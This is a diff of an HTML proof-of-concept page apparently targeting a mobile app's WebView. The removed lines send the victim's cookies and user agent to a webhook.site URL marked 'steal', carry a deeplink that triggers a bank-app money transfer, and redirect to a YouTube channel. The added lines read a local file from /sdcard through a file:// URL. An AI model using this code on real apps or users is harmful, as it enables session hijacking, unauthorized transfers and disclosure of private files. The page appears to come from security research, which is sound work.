@@ -1,19 +1,12 @@
 <html>
   <body>
-    <h1>Quizlet WebView Full Exploit PoC</h1>
-    <p><a href="deeplink://com.bank.app/transfer?amount=1000">Click here to open bank app</a></p>
-
+    <h1>File Access PoC</h1>
     <script>
-      // 1. Steal cookies
-      fetch('https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706/steal?c=' + encodeURIComponent(document.cookie));
-
-      // 2. Fingerprint
-      fetch('https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706/fp?ua=' + encodeURIComponent(navigator.userAgent));
-
-     setTimeout(() => {
-    location.href = 'vnd.youtube://channel/UC_x5XG1OV2P6uZZ5FSM9Ttw';
-  }, 2000);
-      
+      // Try to read a local file (e.g., /sdcard/Download/test.txt)
+      fetch('file:///sdcard/Download/test.txt')
+        .then(r => r.text())
+        .then(t => alert('File contents: ' + t))
+        .catch(e => alert('Error: ' + e));
     </script>
   </body>
 </html>
